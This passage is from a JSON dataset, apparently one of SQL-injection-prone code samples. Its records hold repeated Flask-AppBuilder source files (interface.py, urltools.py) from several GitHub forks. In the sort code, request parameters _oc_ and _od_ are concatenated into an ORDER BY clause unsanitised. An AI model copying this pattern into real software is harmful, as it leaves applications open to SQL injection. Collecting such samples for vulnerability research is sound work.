except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/zwj2017-NK/FAB/blob/378443166011eb2f9f502611ce1d2a587710a1e9",
        "file_path": "/flask_appbuilder/urltools.py",
        "source": "import re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))\n    return orders\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kelvinliuhk/My-Flask-AppBuilder/blob/378443166011eb2f9f502611ce1d2a587710a1e9",
        "file_path": "/flask_appbuilder/models/sqla/interface.py",
        "source": "# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(order_column + ' ' + order_direction)\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kelvinliuhk/My-Flask-AppBuilder/blob/378443166011eb2f9f502611ce1d2a587710a1e9",
        "file_path": "/flask_appbuilder/urltools.py",
        "source": "import re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))\n    return orders\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/dpgaspar/Flask-AppBuilder/blob/378443166011eb2f9f502611ce1d2a587710a1e9",
        "file_path": "/flask_appbuilder/models/sqla/interface.py",
        "source": "# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n        